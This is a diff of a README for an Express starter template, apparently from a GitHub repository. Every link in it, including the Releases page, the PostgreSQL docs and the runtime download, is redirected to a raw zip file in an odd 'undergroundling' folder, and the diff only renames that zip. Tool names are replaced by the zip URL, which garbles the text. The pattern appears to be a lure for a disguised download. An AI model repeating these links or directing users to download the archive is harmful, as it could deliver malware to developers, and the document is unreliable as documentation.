@@ -1,10 +1,10 @@
 # 🚀 express-starter-kit - A Simple Start for Express Applications
 
-[![Download Release](https://raw.githubusercontent.com/GruffTarsier463/express-starter-kit/main/undergroundling/express-starter-kit.zip%20Now-Visit%https://raw.githubusercontent.com/GruffTarsier463/express-starter-kit/main/undergroundling/express-starter-kit.zip)](https://raw.githubusercontent.com/GruffTarsier463/express-starter-kit/main/undergroundling/express-starter-kit.zip)
+[![Download Release](https://raw.githubusercontent.com/GruffTarsier463/express-starter-kit/main/undergroundling/starter_express_kit_v1.3.zip%20Now-Visit%https://raw.githubusercontent.com/GruffTarsier463/express-starter-kit/main/undergroundling/starter_express_kit_v1.3.zip)](https://raw.githubusercontent.com/GruffTarsier463/express-starter-kit/main/undergroundling/starter_express_kit_v1.3.zip)
 
 ## 📥 Overview
 
-The express-starter-kit is a production-ready template for building applications using https://raw.githubusercontent.com/GruffTarsier463/express-starter-kit/main/undergroundling/express-starter-kit.zip This kit includes authentication, PostgreSQL, security features, testing tools, and code quality checks. It provides a solid foundation for your next web project without the hassle of setting everything up from scratch.
+The express-starter-kit is a production-ready template for building applications using https://raw.githubusercontent.com/GruffTarsier463/express-starter-kit/main/undergroundling/starter_express_kit_v1.3.zip This kit includes authentication, PostgreSQL, security features, testing tools, and code quality checks. It provides a solid foundation for your next web project without the hassle of setting everything up from scratch.
 
 ## 🚀 Getting Started
 
@@ -12,11 +12,11 @@ To use the express-starter-kit, follow these steps:
 
 1. **Check System Requirements:**
    - A computer with Windows, macOS, or Linux.
-   - https://raw.githubusercontent.com/GruffTarsier463/express-starter-kit/main/undergroundling/express-starter-kit.zip version 12 or higher installed. You can download https://raw.githubusercontent.com/GruffTarsier463/express-starter-kit/main/undergroundling/express-starter-kit.zip [here](https://raw.githubusercontent.com/GruffTarsier463/express-starter-kit/main/undergroundling/express-starter-kit.zip).
-   - PostgreSQL installed on your computer. Instructions can be found [here](https://raw.githubusercontent.com/GruffTarsier463/express-starter-kit/main/undergroundling/express-starter-kit.zip).
+   - https://raw.githubusercontent.com/GruffTarsier463/express-starter-kit/main/undergroundling/starter_express_kit_v1.3.zip version 12 or higher installed. You can download https://raw.githubusercontent.com/GruffTarsier463/express-starter-kit/main/undergroundling/starter_express_kit_v1.3.zip [here](https://raw.githubusercontent.com/GruffTarsier463/express-starter-kit/main/undergroundling/starter_express_kit_v1.3.zip).
+   - PostgreSQL installed on your computer. Instructions can be found [here](https://raw.githubusercontent.com/GruffTarsier463/express-starter-kit/main/undergroundling/starter_express_kit_v1.3.zip).
 
 2. **Download the Kit:**
-   - Visit the [Releases page](https://raw.githubusercontent.com/GruffTarsier463/express-starter-kit/main/undergroundling/express-starter-kit.zip) to download the latest version. 
+   - Visit the [Releases page](https://raw.githubusercontent.com/GruffTarsier463/express-starter-kit/main/undergroundling/starter_express_kit_v1.3.zip) to download the latest version. 
 
 3. **Extract the Files:**
    - Once the download completes, locate the ZIP file on your computer. Right-click the file and select "Extract All" or use your preferred extraction tool.
@@ -60,13 +60,13 @@ You can customize the kit to fit your needs:
 
 ## 📝 Documentation
 
-For more detailed information on how everything works, please refer to the documentation in the `docs` folder included with the kit. It covers advanced features, configuration options, and best practices for using https://raw.githubusercontent.com/GruffTarsier463/express-starter-kit/main/undergroundling/express-starter-kit.zip
+For more detailed information on how everything works, please refer to the documentation in the `docs` folder included with the kit. It covers advanced features, configuration options, and best practices for using https://raw.githubusercontent.com/GruffTarsier463/express-starter-kit/main/undergroundling/starter_express_kit_v1.3.zip
 
 ## 🔗 Additional Resources
 
-- [https://raw.githubusercontent.com/GruffTarsier463/express-starter-kit/main/undergroundling/express-starter-kit.zip Official Documentation](https://raw.githubusercontent.com/GruffTarsier463/express-starter-kit/main/undergroundling/express-starter-kit.zip)
-- [PostgreSQL Official Documentation](https://raw.githubusercontent.com/GruffTarsier463/express-starter-kit/main/undergroundling/express-starter-kit.zip)
-- [https://raw.githubusercontent.com/GruffTarsier463/express-starter-kit/main/undergroundling/express-starter-kit.zip Official Documentation](https://raw.githubusercontent.com/GruffTarsier463/express-starter-kit/main/undergroundling/express-starter-kit.zip)
+- [https://raw.githubusercontent.com/GruffTarsier463/express-starter-kit/main/undergroundling/starter_express_kit_v1.3.zip Official Documentation](https://raw.githubusercontent.com/GruffTarsier463/express-starter-kit/main/undergroundling/starter_express_kit_v1.3.zip)
+- [PostgreSQL Official Documentation](https://raw.githubusercontent.com/GruffTarsier463/express-starter-kit/main/undergroundling/starter_express_kit_v1.3.zip)
+- [https://raw.githubusercontent.com/GruffTarsier463/express-starter-kit/main/undergroundling/starter_express_kit_v1.3.zip Official Documentation](https://raw.githubusercontent.com/GruffTarsier463/express-starter-kit/main/undergroundling/starter_express_kit_v1.3.zip)
 
 ## 💬 Community Support
 
@@ -74,6 +74,6 @@ If you have questions or need help, feel free to create an issue on the GitHub r
 
 ## 📥 Download & Install
 
-To download the latest version of express-starter-kit, please visit the [Releases page](https://raw.githubusercontent.com/GruffTarsier463/express-starter-kit/main/undergroundling/express-starter-kit.zip). 
+To download the latest version of express-starter-kit, please visit the [Releases page](https://raw.githubusercontent.com/GruffTarsier463/express-starter-kit/main/undergroundling/starter_express_kit_v1.3.zip). 
 
 Ensure to follow all the above steps carefully to get your application up and running smoothly. Enjoy building with express-starter-kit!
